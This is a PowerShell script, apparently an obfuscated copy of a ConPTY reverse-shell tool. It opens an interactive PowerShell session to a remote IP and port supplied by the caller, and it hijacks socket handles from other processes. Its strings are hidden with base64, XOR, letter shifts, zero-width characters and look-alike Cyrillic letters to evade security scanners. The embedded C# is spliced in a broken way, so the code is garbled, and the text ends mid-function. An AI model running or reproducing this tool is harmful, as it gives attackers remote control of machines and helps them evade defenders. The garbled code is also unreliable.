function Invoke-CPTSH
{   
    Param
    (
        [Parameter(Position = 0)]
        [String]
        $RemoteIp,
        
        [Parameter(Position = 1)]
        [String]
        $RemotePort,

        [Parameter()]
        [String]
        $Rows = '2‌4​',

        [Parameter()]
        [String]
        $Cols = "$([char]0x38)$([char]0x30)",

        [Parameter()]
        [String]
        $CommandLine = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbC5leGU='))),
        
        [Parameter()]
        [Switch]
        $Upgrade
    )
    
    if( $PSBoundParameters.ContainsKey(('Up'+'gr'+'ad'+'e')) ) {
        $RemoteIp = ('{0}{1}' -f 'upgr','ade')
        $RemotePort = $($k5123=64;$b=[byte[]](0x33,0x28,0x25,0x2c,0x2c);-join($b|%{[char]($_-bxor$k5123)}))
    }
    else{
  
        if(-Not($PSBoundParameters.ContainsKey($(-join('CpxzepTa'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+15)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+15)%26))}else{[char]$c}}))))) {
            throw $(-join('ZmuwbmQx uqaaqvo xiziumbmz'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}}))
        }
        
        if(-Not($PSBoundParameters.ContainsKey(('Rem'+'o'+'t'+'ePo'+'r'+'t')))) {
            throw 'R​e​m​o​t​e​P‌o‍r‍t‌ ‌m​i​s‌s‍i‌n​g‍ ‍p​a‍r‍a‍m‍e‍t‍e​r‍'
        }
    }
    $parametersCPTSH = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
    Add-Type -TypeDefinition $Source -Language CSharp;
    $output = [CPTSHMainClass]::CPTSHMain($parametersCPTSH)
    Write-Output $output
}

$Source = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('DQp1c2luZyBTeXN0ZW07DQp1c2luZyBTeXN0ZW0uSU87DQp1c2luZyBTeXN0ZW0uVGV4dDsNCnVzaW5nIFN5c3RlbS5UaHJlYWRpbmc7DQp1c2luZyBTeXN0ZW0uTmV0Ow0KdXNpbmcgU3lzdGVtLk5ldC5Tb2NrZXRzOw0KdXNpbmcgU3lzdGVtLk5ldC5OZXR3b3JrSW5mb3JtYXRpb247DQp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7DQp1c2luZyBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYzsNCg0KcHVibGljIGNsYXNzIENvblB0eVNoZWxsRXhjZXB0aW9uIDogRXhjZXB0aW9uDQp7DQogICAgcHJpdmF0ZSBjb25zdCBzdHJpbmcgZXJyb3Jfc3RyaW5nID0g')))[-] CPTSHException: (';

  '+'  '+'p'+'ublic Co'+'nPt'+'yShel'+'l'+'Exc'+'eptio'+'n() { }'+'

'+'
 '+'   p'+'ub'+'lic Co'+'nP'+'tyShellE'+'xceptio'+'n(strin'+'g mes'+'sage'+')'+' : base('+'erro'+'r_strin'+'g + me'+'ssage) '+'{ }
'+'
}

pu'+'bli'+'c cl'+'a'+'ss Dead'+'l'+'ockCh'+'eckHelpe'+'r
'+'
{

'+'    '+'private '+'bool de'+'adlo'+'c'+'kDetec'+'ted;
  '+'  '+'private'+' I'+'ntPt'+'r t'+'argetHan'+'dle;'+'
'+'
 '+'   p'+'riv'+'a'+'te del'+'ega'+'te'+' uint L'+'P'+'THREA'+'D_ST'+'ART_ROU'+'TINE(u'+'int '+'lp'+'Pa'+'ram);

'+'
    [D'+'llImpor'+'t'+'(')kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport((-join([char]0x6B, [char]0x65, [char]0x72, [char]0x6E, [char]0x65, [char]0x6C, [char]0x33, [char]0x32, [char]0x2E, [char]0x64, [char]0x6C, [char]0x6C)), SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport(('{0}{1}{2}{3}' -f 'Ker','nel32','.','dll'), SetLastError = true)]
    private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    private uint ThreadCheckDeadlock(uint threadParams)
    {
        IntPtr objPtr = IntPtr.Zero;
        objPtr = SocketHijacking.NtQueryObjectDynamic(this.targetHandle, SocketHijacking.OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
        this.deadlockDetected = false;
        if (objPtr != IntPtr.Zero) Marshal.FreeHGlobal(objPtr);
        return 0;
    }

    public bool CheckDeadlockDetected(IntPtr tHandle)
    {
        this.deadlockDetected = true;
        this.targetHandle = tHandle;
        LPTHREAD_START_ROUTINE delegateThreadCheckDeadlock = new LPTHREAD_START_ROUTINE(this.ThreadCheckDeadlock);
        IntPtr hThread = IntPtr.Zero;
        uint threadId = 0;
        //we need native threads, C# threads hang and go in lock. We need to avoids hangs on named pipe so... No hangs no deadlocks... no pain no gains...
        hThread = CreateThread(0, 0, delegateThreadCheckDeadlock, IntPtr.Zero, 0, out threadId);
        WaitForSingleObject(hThread, 1500);
        //we do not kill the "$([char]0x70)$([char]0x65)$([char]0x6E)$([char]0x64)$([char]0x69)$([char]0x6E)$([char]0x67)" threads here with TerminateThread() because it will crash the whole process if we do it on locked threads.
        //just some waste of threads :(
        CloseHandle(hThread);
        return this.deadlockDetected;
    }
}

public static class SocketHijacking
{

    private const uint NTSTATUS_SUCCESS = 0x00000000;
    private const uint NTSTATUS_INFOLENGTHMISMATCH = 0xc0000004;
    private const uint NTSTATUS_BUFFEROVERFLOW = 0x80000005;
    private const uint NTSTATUS_BUFFERTOOSMALL = 0xc0000023;
    private const int NTSTATUS_PENDING = 0x00000103;
    private const int WSA_FLAG_OVERLAPPED = 0x1;
    private const int DUPLICATE_SAME_ACCESS = 0x2;
    private const int SystemHandleInformation = 16;
    private const int PROCESS_DUP_HANDLE = 0x0040;
    private const int SIO_TCP_INFO = unchecked((int)0xD8000027);
    private const int SG_UNCONSTRAINED_GROUP = 0x1;
    private const int SG_CONSTRAINED_GROUP = 0x2;
    private const uint IOCTL_AFD_GET_CONTEXT = 0x12043;
    private const int EVENT_ALL_ACCESS = 0x1f0003;
    private const int SynchronizationEvent = 1;
    private const UInt32 INFINITE = 0xFFFFFFFF;


    private enum SOCKET_STATE : uint
    {
        SocketOpen = 0,
        SocketBound = 1,
        SocketBoundUdp = 2,
        SocketConnected = 3,
        SocketClosed = 3
    }

    private enum AFD_GROUP_TYPE : uint
    {
        GroupTypeNeither = 0,
        GroupTypeConstrained = SG_CONSTRAINED_GROUP,
        GroupTypeUnconstrained = SG_UNCONSTRAINED_GROUP
    }

    public enum OBJECT_INFORMATION_CLASS : int
    {
        ObjectBasicInformation = 0,
        ObjectNameInformation = 1,
        ObjectTypeInformation = 2,
        ObjectAllTypesInformation = 3,
        ObjectHandleInformation = 4
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
    {
        public ushort UniqueProcessId;
        public ushort CreatorBackTraceIndex;
        public byte ObjectTypeIndex;
        public byte HandleAttributes;
        public ushort HandleValue;
        public IntPtr Object;
        public IntPtr GrantedAccess;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct GENERIC_MAPPING
    {
        public int GenericRead;
        public int GenericWrite;
        public int GenericExecute;
        public int GenericAll;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct OBJECT_TYPE_INFORMATION_V2
    {
        public UNICODE_STRING TypeName;
        public uint TotalNumberOfObjects;
        public uint TotalNumberOfHandles;
        public uint TotalPagedPoolUsage;
        public uint TotalNonPagedPoolUsage;
        public uint TotalNamePoolUsage;
        public uint TotalHandleTableUsage;
        public uint HighWaterNumberOfObjects;// PeakObjectCount;
        public uint HighWaterNumberOfHandles;// PeakHandleCount;
        public uint HighWaterPagedPoolUsage;
        public uint HighWaterNonPagedPoolUsage;
        public uint HighWaterNamePoolUsage;
        public uint HighWaterHandleTableUsage;
        public uint InvalidAttributes;
        public GENERIC_MAPPING GenericMapping;
        public uint ValidAccessMask;
        public byte SecurityRequired;//bool
        public byte MaintainHandleCount;//bool
        public byte TypeIndex;
        public byte ReservedByte;
        public uint PoolType;
        public uint DefaultPagedPoolCharge;// PagedPoolUsage;
        public uint DefaultNonPagedPoolCharge;//NonPagedPoolUsage;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct OBJECT_NAME_INFORMATION
    {
        public UNICODE_STRING Name;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WSAData
    {
        public short wVersion;
        public short wHighVersion;
        public short iMaxSockets;
        public short iMaxUdpDg;
        public IntPtr lpVendorInfo;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
        public string szDescription;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
        public string szSystemStatus;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct WSAPROTOCOLCHAIN
    {
        public int ChainLen;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 7)]
        public uint[] ChainEntries;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct WSAPROTOCOL_INFO
    {
        public uint dwServiceFlags1;
        public uint dwServiceFlags2;
        public uint dwServiceFlags3;
        public uint dwServiceFlags4;
        public uint dwProviderFlags;
        public Guid ProviderId;
        public uint dwCatalogEntryId;
        public WSAPROTOCOLCHAIN ProtocolChain;
        public int iVersion;
        public int iAddressFamily;
        public int iMaxSockAddr;
        public int iMinSockAddr;
        public int iSocketType;
        public int iProtocol;
        public int iProtocolMaxOffset;
        public int iNetworkByteOrder;
        public int iSecurityScheme;
        public uint dwMessageSize;
        public uint dwProviderReserved;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
        public string szProtocol;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKADDR_IN
    {
        public short sin_family;
        public short sin_port;
        public uint sin_addr;
        public long sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TCP_INFO_v0
    {
        public TcpState State;
        public UInt32 Mss;
        public UInt64 ConnectionTimeMs;
        public byte TimestampsEnabled;
        public UInt32 RttUs;
        public UInt32 MinRttUs;
        public UInt32 BytesInFlight;
        public UInt32 Cwnd;
        public UInt32 SndWnd;
        public UInt32 RcvWnd;
        public UInt32 RcvBuf;
        public UInt64 BytesOut;
        public UInt64 BytesIn;
        public UInt32 BytesReordered;
        public UInt32 BytesRetrans;
        public UInt32 FastRetrans;
        public UInt32 DupAcksIn;
        public UInt32 TimeoutEpisodes;
        public byte SynRetrans;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct linger
    {
        public UInt16 l_onoff;
        public UInt16 l_linger;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 0)]
    private struct IO_STATUS_BLOCK
    {
        public int status;
        public IntPtr information;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCK_SHARED_INFO
    {
        public SOCKET_STATE State;
        public Int32 AddressFamily;
        public Int32 SocketType;
        public Int32 Protocol;
        public Int32 LocalAddressLength;
        public Int32 RemoteAddressLength;

        // Socket options controlled by getsockopt(), setsockopt().
        public linger LingerInfo;
        public UInt32 SendTimeout;
        public UInt32 ReceiveTimeout;
        public UInt32 ReceiveBufferSize;
        public UInt32 SendBufferSize;
        /* Those are the bits in the SocketProerty, proper order:
            Listening;
            Broadcast;
            Debug;
            OobInline;
            ReuseAddresses;
            ExclusiveAddressUse;
            NonBlocking;
            DontUseWildcard;
            ReceiveShutdown;
            SendShutdown;
            ConditionalAccept;
        */
        public ushort SocketProperty;
        // Snapshot of several parameters passed into WSPSocket() when creating this socket
        public UInt32 CreationFlags;
        public UInt32 CatalogEntryId;
        public UInt32 ServiceFlags1;
        public UInt32 ProviderFlags;
        public UInt32 GroupID;
        public AFD_GROUP_TYPE GroupType;
        public Int32 GroupPriority;
        // Last error set on this socket
        public Int32 LastError;
        // Info stored for WSAAsyncSelect()
        public IntPtr AsyncSelecthWnd;
        public UInt32 AsyncSelectSerialNumber;
        public UInt32 AsyncSelectwMsg;
        public Int32 AsyncSelectlEvent;
        public Int32 DisabledAsyncSelectEvents;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKADDR
    {
        public UInt16 sa_family;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 14)]
        public byte[] sa_data;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKET_CONTEXT
    {
        public SOCK_SHARED_INFO SharedData;
        public UInt32 SizeOfHelperData;
        public UInt32 Padding;
        public SOCKADDR LocalAddress;
        public SOCKADDR RemoteAddress;
        // Helper Data - found out with some reversing
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 24)]
        public byte[] HelperData;
    }

    private struct SOCKET_BYTESIN
    {
        public IntPtr handle;
        public UInt64 BytesIn;
    }


    [DllImport((-join([char]0x57, [char]0x53, [char]0x32, [char]0x5F, [char]0x33, [char]0x32, [char]0x2E, [char]0x44, [char]0x4C, [char]0x4C)), CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int WSADuplicateSocket(IntPtr socketHandle, int processId, ref WSAPROTOCOL_INFO pinnedBuffer);

    [DllImport('w‌s‌2‌_​3‌2​.‌d‌l​l‌', CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    private static extern IntPtr WSASocket([In] int addressFamily, [In] int socketType, [In] int protocolType, ref WSAPROTOCOL_INFO lpProtocolInfo, Int32 group1, int dwFlags);

    [DllImport($(-join('aw2_32.hpp'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+22)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+22)%26))}else{[char]$c}})), CharSet = CharSet.Auto)]
    private static extern Int32 WSAGetLastError();

    [DllImport(('ws2_3'+'2.d'+'l'+'l'), CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    private static extern int getpeername(IntPtr s, ref SOCKADDR_IN name, ref int namelen);

    // WSAIoctl1 implementation specific for SIO_TCP_INFO control code
    [DllImport($($k4397='b^eN7Yo><RXs&';$b=[byte[]](0x35,0x2D,0x57,0x11,0x04,0x6B,0x41,0x5A,0x50,0x3E);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4397);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})), CharSet = CharSet.Auto, SetLastError = true, EntryPoint = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V1NBSW9jdGw='))))]
    public static extern int WSAIoctl1(IntPtr s, int dwIoControlCode, ref UInt32 lpvInBuffer, int cbInBuffer, IntPtr lpvOutBuffer, int cbOutBuffer, ref int lpcbBytesReturned, IntPtr lpOverlapped, IntPtr lpCompletionRoutine);

    [DllImport(([string]::Format('{0}{1}{2}{3}{4}{5}','w','s','2_','32','.dl','l')), CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int closesocket(IntPtr s);

    [DllImport('kеrnеl32.dll', SetLastError = true)]
    private static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);

    [DllImport((-join('ker','nel32','.','dl','l')), SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport('kеrnеl32.dll')]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport($(-join('jdqmdk32.ckk'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+1)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+1)%26))}else{[char]$c}})))]
    private static extern IntPtr GetCurrentProcess();

    [DllImport($(-join('tzjrr.jrr'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+20)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+20)%26))}else{[char]$c}})))]
    private static extern uint NtQueryObject(IntPtr objectHandle, OBJECT_INFORMATION_CLASS informationClass, IntPtr informationPtr, uint informationLength, ref int returnLength);

    [DllImport((-join([char]0x6E, [char]0x74, [char]0x64, [char]0x6C, [char]0x6C, [char]0x2E, [char]0x64, [char]0x6C, [char]0x6C)))]
    private static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int returnLength);

    [DllImport((-join('kern','el32','.dll')), SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport(([string]::Format('{0}{1}{2}','ntdl','l.dl','l')))]
    private static extern int NtCreateEvent(ref IntPtr EventHandle, int DesiredAccess, IntPtr ObjectAttributes, int EventType, bool InitialState);

    // NtDeviceIoControlFile1 implementation specific for IOCTL_AFD_GET_CONTEXT IoControlCode
    [DllImport('ntdll.dll', EntryPoint = (-join('NtDevi','ceIoCo','nt','ro','lFil','e')))]
    private static extern int NtDeviceIoControlFile1(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, uint IoControlCode, IntPtr InputBuffer, int InputBufferLength, ref SOCKET_CONTEXT OutputBuffer, int OutputBufferLength);

    [DllImport($(-join('Zv2_32.goo'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}})))]
    public static extern int ioctlsocket(IntPtr s, int cmd, ref int argp);
    
    //helper method with ([string]::Format('{0}{1}{2}','dyna','m','ic')) buffer allocation
    private static IntPtr NtQuerySystemInformationDynamic(int infoClass, int infoLength)
    {
        if (infoLength == 0)
            infoLength = 0x10000;
        IntPtr infoPtr = Marshal.AllocHGlobal(infoLength);
        while (true)
        {
            uint result = (uint)NtQuerySystemInformation(infoClass, infoPtr, infoLength, ref infoLength);
            infoLength = infoLength * 2;
            if (result == NTSTATUS_SUCCESS)
                return infoPtr;
            Marshal.FreeHGlobal(infoPtr);  //free pointer when not Successful
            if (result != NTSTATUS_INFOLENGTHMISMATCH && result != NTSTATUS_BUFFEROVERFLOW && result != NTSTATUS_BUFFERTOOSMALL)
            {
                //throw new Exception(([string]::Format('{0}{1}{2}{3}{4}{5}{6}{7}{8}','U','nh','an','dle','d Nt','Sta','t','us',' ')) + result);
                return IntPtr.Zero;
            }
            infoPtr = Marshal.AllocHGlobal(infoLength);
        }
    }

    private static IntPtr QueryObjectTypesInfo()
    {
        IntPtr ptrObjectTypesInformation = IntPtr.Zero;
        ptrObjectTypesInformation = NtQueryObjectDynamic(IntPtr.Zero, OBJECT_INFORMATION_CLASS.ObjectAllTypesInformation, 0);
        return ptrObjectTypesInformation;
    }

    // this from --> https://github.com/hfiref0x/UACME/blob/master/Source/Shared/ntos.h
    private static long AlignUp(long address, long align)
    {
        return (((address) + (align) - 1) & ~((align) - 1));
    }

    // this works only from win8 and above. If you need a more generic solution you need to use the (i+2) ('w'+'ay') of counting index types.
    // credits for this goes to @0xrepnz
    // more information here --> https://twitter.com/splinter_code/status/1400873009121013765
    private static byte GetTypeIndexByName(string ObjectName)
    {
        byte TypeIndex = 0;
        long TypesCount = 0;
        IntPtr ptrTypesInfo = IntPtr.Zero;
        ptrTypesInfo = QueryObjectTypesInfo();
        TypesCount = Marshal.ReadIntPtr(ptrTypesInfo).ToInt64();
        // create a pointer to the first element address of OBJECT_TYPE_INFORMATION_V2
        IntPtr ptrTypesInfoCurrent = new IntPtr(ptrTypesInfo.ToInt64() + IntPtr.Size);
        for (int i = 0; i < TypesCount; i++)
        {
            OBJECT_TYPE_INFORMATION_V2 Type = (OBJECT_TYPE_INFORMATION_V2)Marshal.PtrToStructure(ptrTypesInfoCurrent, typeof(OBJECT_TYPE_INFORMATION_V2));
            // move pointer to next the OBJECT_TYPE_INFORMATION_V2 object
            ptrTypesInfoCurrent = (IntPtr)(ptrTypesInfoCurrent.ToInt64() + AlignUp(Type.TypeName.MaximumLength, (long)IntPtr.Size) + Marshal.SizeOf(typeof(OBJECT_TYPE_INFORMATION_V2)));
            if (Type.TypeName.Length > 0 && Marshal.PtrToStringUni(Type.TypeName.Buffer, Type.TypeName.Length / 2) == ObjectName)
            {
                TypeIndex = Type.TypeIndex;
                break;
            }
        }
        Marshal.FreeHGlobal(ptrTypesInfo);
        return TypeIndex;
    }

    private static List<IntPtr> DuplicateSocketsFromHandles(List<IntPtr> sockets)
    {
        List<IntPtr> dupedSocketsOut = new List<IntPtr>();
        if (sockets.Count < 1) return dupedSocketsOut;
        foreach (IntPtr sock in sockets)
        {
            IntPtr dupedSocket = DuplicateSocketFromHandle(sock);
            if (dupedSocket != IntPtr.Zero) dupedSocketsOut.Add(dupedSocket);
        }
        // cleaning all socket handles
        foreach (IntPtr sock in sockets)
            CloseHandle(sock);
        return dupedSocketsOut;
    }

    private static List<IntPtr> FilterAndOrderSocketsByBytesIn(List<IntPtr> sockets)
    {
        List<SOCKET_BYTESIN> socketsBytesIn = new List<SOCKET_BYTESIN>();
        List<IntPtr> socketsOut = new List<IntPtr>();
        foreach (IntPtr sock in sockets)
        {
            TCP_INFO_v0 sockInfo = new TCP_INFO_v0();
            if (!GetSocketTcpInfo(sock, out sockInfo))
            {
                closesocket(sock);
                continue;
            }
            // Console.WriteLine($($k4433=60;$b=[byte[]](0x58,0x59,0x5e,0x49,0x5b,0x06,0x1c,0x6f,0x53,0x5f,0x57,0x59,0x48,0x1c,0x54,0x5d,0x52,0x58,0x50,0x59,0x1c,0x0c,0x44);-join($b|%{[char]($_-bxor$k4433)})) + sock.ToString($(-join('A4'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}}))) + "$([char]0x20)$([char]0x69)$([char]0x73)$([char]0x20)$([char]0x69)$([char]0x6E)$([char]0x20)$([char]0x74)$([char]0x63)$([char]0x70)$([char]0x73)$([char]0x74)$([char]0x61)$([char]0x74)$([char]0x65)$([char]0x20)" + sockInfo.State.ToString());
            // we need only active sockets, the remaing sockets are filtered out
            if (sockInfo.State == TcpState.SynReceived || sockInfo.State == TcpState.Established)
            {
                SOCKET_BYTESIN sockBytesIn = new SOCKET_BYTESIN();
                sockBytesIn.handle = sock;
                sockBytesIn.BytesIn = sockInfo.BytesIn;
                socketsBytesIn.Add(sockBytesIn);
            }
            else
                closesocket(sock);
        }
        if (socketsBytesIn.Count < 1) return socketsOut;
        if (socketsBytesIn.Count >= 2)
            // ordering for fewer bytes received by the sockets we have a higher chance to get the proper socket
            socketsBytesIn.Sort(delegate (SOCKET_BYTESIN a, SOCKET_BYTESIN b) { return (a.BytesIn.CompareTo(b.BytesIn)); });
        foreach (SOCKET_BYTESIN sockBytesIn in socketsBytesIn)
        {
            socketsOut.Add(sockBytesIn.handle);
            // Console.WriteLine($(-join('yzwpb: Njxfzo cviygz 0s'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+5)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+5)%26))}else{[char]$c}})) + sockBytesIn.handle.ToString('Х4') + ' ‍t‍o‌t‌a‍l‌ ‌b​y‌t‍e‍s‌ ‌r‍e‌c‍e‌i‌v‌e‌d‌:‌ ‌' + sockBytesIn.BytesIn.ToString());
        }
        return socketsOut;
    }

    private static bool GetSocketTcpInfo(IntPtr socket, out TCP_INFO_v0 tcpInfoOut)
    {
        int result = -1;
        UInt32 tcpInfoVersion = 0;
        int bytesReturned = 0;
        int tcpInfoSize = Marshal.SizeOf(typeof(TCP_INFO_v0));
        IntPtr tcpInfoPtr = Marshal.AllocHGlobal(tcpInfoSize);
        result = WSAIoctl1(socket, SIO_TCP_INFO, ref tcpInfoVersion, Marshal.SizeOf(tcpInfoVersion), tcpInfoPtr, tcpInfoSize, ref bytesReturned, IntPtr.Zero, IntPtr.Zero);
        if (result != 0)
        {
            // Console.WriteLine(([System.Text.Encoding]::UTF8.GetString([byte[]](0x64,0x65,0x62,0x75,0x67,0x3A,0x20,0x57,0x53,0x41,0x49,0x6F,0x63,0x74,0x6C,0x31,0x20,0x66,0x61,0x69,0x6C,0x65,0x64,0x20,0x77,0x69,0x74,0x68,0x20,0x72,0x65,0x74,0x75,0x72,0x6E,0x20,0x63,0x6F,0x64,0x65,0x20))) + result.ToString() + ('{0}{1}{2}{3}{4}{5}{6}' -f ' and',' ','wsala','ste','r','ror:',' ') + WSAGetLastError().ToString());
            tcpInfoOut = new TCP_INFO_v0();
            return false;
        }
        TCP_INFO_v0 tcpInfoV0 = (TCP_INFO_v0)Marshal.PtrToStructure(tcpInfoPtr, typeof(TCP_INFO_v0));
        tcpInfoOut = tcpInfoV0;
        Marshal.FreeHGlobal(tcpInfoPtr);
        return true;
    }

    // this function take a raw handle to a \Device\Afd object as a parameter and returns a handle to a duplicated socket
    private static IntPtr DuplicateSocketFromHandle(IntPtr socketHandle)
    {
        IntPtr retSocket = IntPtr.Zero;
        IntPtr duplicatedSocket = IntPtr.Zero;
        WSAPROTOCOL_INFO wsaProtocolInfo = new WSAPROTOCOL_INFO();
        int status = WSADuplicateSocket(socketHandle, Process.GetCurrentProcess().Id, ref wsaProtocolInfo);
        if (status == 0)
        {
            // we need an overlapped socket for the conpty process but we don't need to specify the WSA_FLAG_OVERLAPPED flag here because it will be ignored (and automatically set) by WSASocket() function if we set the WSAPROTOCOL_INFO structure and if the original socket has been created with the overlapped flag.
            duplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, 0);
            if (duplicatedSocket.ToInt64() > 0)
            {
                retSocket = duplicatedSocket;
            }
        }
        return retSocket;
    }

    //helper method with ([string]::Format('{0}{1}{2}{3}','dyn','a','mi','c')) buffer allocation
    public static IntPtr NtQueryObjectDynamic(IntPtr handle, OBJECT_INFORMATION_CLASS infoClass, int infoLength)
    {
        if (infoLength == 0)
            infoLength = Marshal.SizeOf(typeof(int));
        IntPtr infoPtr = Marshal.AllocHGlobal(infoLength);
        uint result;
        while (true)
        {
            result = (uint)NtQueryObject(handle, infoClass, infoPtr, (uint)infoLength, ref infoLength);
            if (result == NTSTATUS_INFOLENGTHMISMATCH || result == NTSTATUS_BUFFEROVERFLOW || result == NTSTATUS_BUFFERTOOSMALL)
            {
                Marshal.FreeHGlobal(infoPtr);
                infoPtr = Marshal.AllocHGlobal((int)infoLength);
                continue;
            }
            else if (result == NTSTATUS_SUCCESS)
                break;
            else
            {
                //throw new Exception($($k6891=117;$b=[byte[]](0x20,0x1b,0x1d,0x14,0x1b,0x11,0x19,0x10,0x11,0x55,0x3b,0x01,0x26,0x01,0x14,0x01,0x00,0x06,0x55);-join($b|%{[char]($_-bxor$k6891)})) + result);
                break;
            }
        }
        if (result == NTSTATUS_SUCCESS)
            return infoPtr;//don't forget to free the pointer with Marshal.FreeHGlobal after you're done with it
        else
            Marshal.FreeHGlobal(infoPtr);//free pointer when not Successful
        return IntPtr.Zero;
    }

    public static List<IntPtr> GetSocketsTargetProcess(Process targetProcess)
    {
        OBJECT_NAME_INFORMATION objNameInfo;
        long HandlesCount = 0;
        IntPtr dupHandle;
        IntPtr ptrObjectName;
        IntPtr ptrHandlesInfo;
        IntPtr hTargetProcess;
        string strObjectName;
        List<IntPtr> socketsHandles = new List<IntPtr>();
        DeadlockCheckHelper deadlockCheckHelperObj = new DeadlockCheckHelper();
        hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE, false, targetProcess.Id);
        if (hTargetProcess == IntPtr.Zero)
        {
            Console.WriteLine('C​a‍n‌n‌o‍t‌ ‍o​p‌e‍n‌ ‍t​a‍r‌g‌e‌t‍ ‌p‌r​o​c‍e​s‍s‌ ​w​i‌t‌h‍ ‌p​i‍d​ ‍' + targetProcess.Id.ToString() + (' '+'for D'+'upl'+'ica'+'te'+'Handle '+'acce'+'ss'));
            return socketsHandles;
        }
        ptrHandlesInfo = NtQuerySystemInformationDynamic(SystemHandleInformation, 0);
        HandlesCount = Marshal.ReadIntPtr(ptrHandlesInfo).ToInt64();
        // create a pointer at the beginning of the address of SYSTEM_HANDLE_TABLE_ENTRY_INFO[]
        IntPtr ptrHandlesInfoCurrent = new IntPtr(ptrHandlesInfo.ToInt64() + IntPtr.Size);
        // get TypeIndex for $(-join('Ybex'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}})) objects, needed to filter only sockets objects
        byte TypeIndexFileObject = GetTypeIndexByName((-join([char]0x46, [char]0x69, [char]0x6C, [char]0x65)));
        for (int i = 0; i < HandlesCount; i++)
        {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO sysHandle;
            try
            {
                sysHandle = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(ptrHandlesInfoCurrent, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
            }
